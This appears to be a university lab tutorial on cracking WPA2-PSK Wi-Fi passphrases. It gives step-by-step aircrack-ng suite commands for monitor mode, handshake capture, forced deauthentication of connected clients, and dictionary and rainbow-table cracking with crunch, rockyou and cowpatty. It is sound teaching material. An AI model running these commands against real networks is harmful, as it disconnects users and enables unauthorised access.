# Crack WPA2 Password
## How WPA2 works
WPA2 uses dynamic key encryption, which regularly changes the key and makes it more difficult to crack.

In a WPA2-personal network, individual clients on a network are given unique encryption keys when they provide a pre-shared key.

WPA2 in mandatorily uses the **AES-CCMP** algorithm for encryption, which is much more powerful and robust than **TKIP**.

Both WPA and WPA2 allow either EAP-based authentication, using RADIUS servers (Enterprise) or a **Pre-Shared key (PSK)** (personal)-based authentication schema.

**WPA/WPA2 PSK** is vulnerable to a dictionary attack. The inputs required for this attack are the four-way WPA handshake between client and access point, and a wordlist that contains common passphrases. Then, using tools such as Aircrack-ng, we can try to crack the WPA/WPA2 PSK passphrase.

An illustration of the four-way handshake is shown in the following image
![alt text](https://static.packt-cdn.com/products/9781783280414/graphics/0414OS_04_15.jpg)

# Read WiFi Network Interface Data

 1. Authenticate as superuser
 2. Execute `iw` command in order to find and manipulate your wireless devices and their configuration 
```
sudo su 
iw dev
```
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/1.%20iw%20dev.png?raw=true)

# Start cracking

 * The first thing we have to do is to set our network card in *monitor mode* which allows to monitor all traffic received on a wireless channel
    * `airmon-ng start <INTERFACE_NAME>`
 * Check again your network wireless card name using `iw dev` command
     * `iw dev`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/2.%20iw%20dev.png?raw=true)
 * Let's now start `airodump-ng` in order to obtain some useful information about `AP Name`, `Channel` and `BSSID`
    * `airodump-ng <INTERFACE_NAME_MONITOR_MODE>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/3.%20airodump-ng.png?raw=true)
 * We can now start capturing some data using (again) `airodump-ng` command
   * `airodump-ng -c <NUM_CHANNEL> --bssid <AP_MAC_ADDRESS> -w <OUTPUT_FILE_CAPTURE> <INTERFACE_NAME_MONITOR_MODE>`
 * Our goal is to capture the **WPA2 handshake**. To do that, we try to de-authenticate all hosts connected to the AP using the `aireplay-ng` command; finally, we need to wait until at least one host will  auto reconnect to the AP
   * `aireplay-ng -0 2 -a <AP_MAC_ADDRESS> <INTERFACE_NAME_MONITOR_MODE>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/4.%20handshake.png?raw=true)

 * Once the WPA2 handshake has been captured, we can start cracking the password


## Bruteforce attack using dictionaries
One of the things that we will try out with breaking through WPA and WPA2, is by using a dictionary attack. Dictionary attack is a technique to break through an authentication mechanism by trying to figure out it’s decryption key or passphrase by trying out hundreds, thousands or even billions of likely possibilities. Most vulnerable victims of this attacks are Wi-Fi’s that have their password set to something simple, such as `cat`, `dog`, `airplane`, `football` and so on - like the words in a dictionary

### Create a dictionary using `cruch` tool
One of the possibility is to self create a dictionary using some CLI tools. `cruch` allows us to create dictionaries specifying many parameters such as `min` and `max` password length, `charset` and even `patterns`
 * `crunch <min_lenght> <max_lenght> charset [-t <pattern> ] -o dictionary.txt`

For example, in order to create a dictionary containing all the words from 5 to 8 chars only in lowercase, we can execute the following command
 * `crunch 5 8 qwertyuiopasdfghjklzxcvbnm -o dictionary.txt`

In our exercises, we will use some dictionaries which can be downloaded from the Iternet. The first one is called `john dictionary` whereas the second one is called `rockyou dictionary`
```
sudo su
apt install john
mkdir /usr/share/rockyou
cd /usr/share/rockyou
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```
After that, the dictionaries can be found in the `/usr/share/john` and `/usr/share/rockyou` folders, respectively.

## Start a `Bruteforce` attack
We can now start the bruteforce attack. We suggest to use `john` and/or `rockyou` dictionary to complete the exercise before the end of the laboratory session

 * `aircrack-ng -w <YOUR_DICTIONARY_FILE> <OUTPUT_FILE_CAPTURE>.cap`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/5.%20bruteforce.png?raw=true)

## Start a `Rainbow Table` attack
`Rainbow Tables` are pre-computed tables of hash values that are pre-matched to possible plain text passwords. Rainbow tables are mainly used to crack hashes very quickly.

### Advantages of using Rainbow table
 * Searching the rainbow table is very fast
 * Once created, it does not require computing resources
 * Once created, you can use it on multiple wireless access points

### Disadvantages of using Rainbow table
 * It takes up a lot of space, much more than just the password file
 * The process of combining the password and the ESSID to create the PMK takes a good bit of time

Computing rainbow tables takes exactly the same amount of time as a brute force, but searching the generated rainbow table takes a split second. So, if you want to test one handshake per an Access Point, then there is no difference between brute-force and using rainbow tables

A `rainbow table` can be created using the `genpmk` command (starting from a dictionary) and can be used using `cowpatty` command
```
sudo su
apt install cowpatty
genpmk -f <PATH_TO_DICTIONARY> -s <NETWORK_SSID> -d <OUTPUT_RAINBOW_TABLE>
```

Cowpatty can be executed in the following way
 * `cowpatty -d <OUTPUT_RAINBOW_TABLE> -r <OUTPUT_FILE_CAPTURE> -s <NETWORK_SSID>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/6.%20rainbow%20table.png?raw=true)
## Stop Monitor Mode

Remember to disable the **monitor mode** from your wireless network card
 * `airmon-ng stop <INTERFACE_NAME>`
